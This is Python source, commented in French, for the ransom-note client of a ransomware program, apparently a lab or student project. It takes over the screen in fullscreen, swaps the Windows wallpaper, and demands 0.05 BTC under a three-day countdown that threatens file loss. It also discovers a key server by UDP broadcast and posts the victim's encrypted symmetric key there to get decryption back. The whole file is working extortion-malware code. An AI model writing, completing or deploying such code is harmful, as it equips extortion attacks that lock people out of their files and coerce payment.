import ctypes
import tkinter as tk
from tkinter import messagebox
import time
from threading import Thread
import random
import sys
import os
# Ajouter le répertoire parent au chemin de recherche des modules
parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
sys.path.append(parent_dir)
from utils import resource_path
import requests
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from decryption import decrypt_file
import socket
import threading
import configparser

class RansomwareGUI:
    TIMER_FILE = "timer_data.txt"
    LOG_FILE = "interaction_log.txt"
    NEW_WALLPAPER = "new_wallpaper.jpg"
    OLD_WALLPAPER = "old_wallpaper.txt"

    def __init__(self, root):
        self.root = root
        self.root.title("Alerte Ransomware")
        self.root.attributes("-fullscreen", True)
        self.root.configure(bg="#1e1e1e")
        self.root.resizable(True, False)

        self.payment_var = tk.BooleanVar()

        # Charger la configuration
        self.config = self.load_config()
        self.server_ip = self.config['SERVER']['client_ip']
        self.server_port = self.config['SERVER']['client_port']

        self.save_old_wallpaper()
        self.set_wallpaper(self.NEW_WALLPAPER)

        self.setup_ui()
        self.discover_server()
        self.start_timer()

    def load_config(self, config_file='server/config.ini'):
        config_path = resource_path(config_file)
        config = configparser.ConfigParser()
        config.read(config_path)
        return config

    def save_old_wallpaper(self):
        SPI_GETDESKWALLPAPER = 0x0073
        buffer_size = 260
        buffer = ctypes.create_unicode_buffer(buffer_size)
        ctypes.windll.user32.SystemParametersInfoW(SPI_GETDESKWALLPAPER, buffer_size, buffer, 0)
        with open(self.OLD_WALLPAPER, 'w') as file:
            file.write(buffer.value)

    def set_wallpaper(self, image_path):
        SPI_SETDESKWALLPAPER = 0x0014
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 3)

    def restore_old_wallpaper(self):
        if os.path.exists(self.OLD_WALLPAPER):
            with open(self.OLD_WALLPAPER, 'r') as file:
                old_wallpaper = file.read()
            self.set_wallpaper(old_wallpaper)

    def load_timer(self):
        if os.path.exists(self.TIMER_FILE):
            with open(self.TIMER_FILE, 'r') as file:
                end_time = float(file.read())
        else:
            end_time = time.time() + 259200  # 3 jours
            with open(self.TIMER_FILE, 'w') as file:
                file.write(str(end_time))
        return end_time

    def update_timer(self, label, end_time):
        def countdown():
            while True:
                remaining_time = int(end_time - time.time())
                if remaining_time <= 0:
                    label.config(text="Le temps est écoulé !", fg="red")
                    if os.path.exists(self.TIMER_FILE):
                        os.remove(self.TIMER_FILE)  # Supprime le fichier de timer
                    break
                heures, reste = divmod(remaining_time, 3600)
                minutes, secondes = divmod(reste, 60)
                label.config(text=f"Temps restant : {heures:02}h {minutes:02}m {secondes:02}s")
                time.sleep(1)
        Thread(target=countdown, daemon=True).start()

    def simulate_decrypting(self):
        self.decrypt_label.config(text="Déchiffrement en cours...")
        current_percent = 0
        while current_percent < 100:
            time.sleep(random.uniform(0.1, 0.3))  # Temps aléatoire pour le faux chargement
            current_percent += random.randint(1, 10)
            if current_percent > 100:
                current_percent = 100
            self.decrypt_percent.config(text=f"{current_percent}%")
            self.root.update()

        self.decrypt_label.config(text="Déchiffrement terminé !")

    def log_interaction(self, action):
        with open(self.LOG_FILE, 'a') as log_file:
            log_file.write(f"{time.ctime()}: {action}\n")

    def show_ransom_message(self):
        messagebox.showinfo("Ransomware", "Vos fichiers ont été chiffrés. Payez la rançon pour les déchiffrer.")

    def request_symmetric_key(self):
        if not self.server_ip:
            messagebox.showerror("Erreur", "Serveur non trouvé.")
            return

        encrypted_symmetric_key_path = os.path.join(os.path.dirname(__file__), 'keys', 'encrypted_symmetric_key.bin')
        with open(encrypted_symmetric_key_path, 'rb') as key_file:
            encrypted_symmetric_key = key_file.read()

        response = requests.post(
            f'http://{self.server_ip}:{self.server_port}/get_symmetric_key',
            json={'paid': True, 'encrypted_symmetric_key': encrypted_symmetric_key.hex()}
        )

        if response.status_code == 200:
            symmetric_key = bytes.fromhex(response.json()['symmetric_key'])
            self.decrypt_files(symmetric_key)
        else:
            messagebox.showerror("Erreur", "Le paiement n'a pas été effectué.")


    def decrypt_files(self, symmetric_key):
        file_path = 'example.txt'
        decrypt_file(file_path, symmetric_key)
        messagebox.showinfo("Déchiffrement", "Vos fichiers ont été déchiffrés.")
        self.log_interaction("Fichiers déchiffrés avec succès")
        self.restore_old_wallpaper()
        self.root.destroy()
        if os.path.exists(self.TIMER_FILE):
            os.remove(self.TIMER_FILE)

    def discover_server(self):
        def broadcast_listener():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            sock.bind(('', 5001))
            while not self.server_ip:
                data, addr = sock.recvfrom(1024)
                if data.startswith(b'SERVER_IP:'):
                    self.server_ip = data[len(b'SERVER_IP:'):].decode()
                    print(f"Serveur trouvé à l'adresse {self.server_ip}")

        threading.Thread(target=broadcast_listener).start()

    def setup_ui(self):
        message = (
            "⚠️ Vos fichiers ont été chiffrés ! ⚠️\n"
            "Pour les récupérer, envoyez 0,05 BTC à l'adresse ci-dessous.\n"
            "Adresse Bitcoin : 1JZsj2Ebs7ue21KjH\n"
            "Si le paiement n'est pas effectué avant la fin du timer, les fichiers seront perdus."
        )
        self.label_message = tk.Label(
            self.root, text=message, font=("Courier", 14), wraplength=650, justify="center", fg="#00ff00", bg="#1e1e1e"
        )
        self.label_message.pack(pady=30)

        Thread(target=self.sliding_text, daemon=True).start()

        self.timer_label = tk.Label(self.root, text="", font=("Courier", 16), fg="red", bg="#1e1e1e")
        self.timer_label.pack(pady=15)

        self.payment_checkbox = tk.Checkbutton(
            self.root, text="Paiement effectué", variable=self.payment_var, font=("Courier", 12),
            fg="white", bg="#1e1e1e", activebackground="#1e1e1e", activeforeground="#00ff00", selectcolor="#1e1e1e"
        )
        self.payment_checkbox.pack(pady=10)

        self.decrypt_button = tk.Button(
            self.root, text="Déchiffrer les fichiers", command=self.decrypt_files_action,
            bg="#ff1e1e", fg="white", font=("Courier", 16), width=25, height=3, activebackground="#ff4d4d"
        )
        self.decrypt_button.pack(pady=30)

        self.decrypt_label = tk.Label(self.root, text="", font=("Courier", 32), fg="#00ff00", bg="#1e1e1e")
        self.decrypt_label.pack(pady=10)

        self.decrypt_percent = tk.Label(self.root, text="", font=("Courier", 32), fg="#00ff00", bg="#1e1e1e")
        self.decrypt_percent.pack(pady=10)

    def sliding_text(self):
        text = self.label_message.cget("text")
        i = 0
        while i < (len(text)):
            for i in range(len(text) + 1):
                self.label_message.config(text=text[:i])
                time.sleep(0.05)
            time.sleep(0.5)

    def start_timer(self):
        end_time = self.load_timer()
        self.update_timer(self.timer_label, end_time)

    def decrypt_files_action(self):
        if self.payment_var.get():
            self.request_symmetric_key()
        else:
            messagebox.showwarning("Action requise", "Les fichiers ne peuvent pas être déchiffrés sans paiement !")
        self.log_interaction("Tentative de déchiffrement ratée : Paiement non effectué")
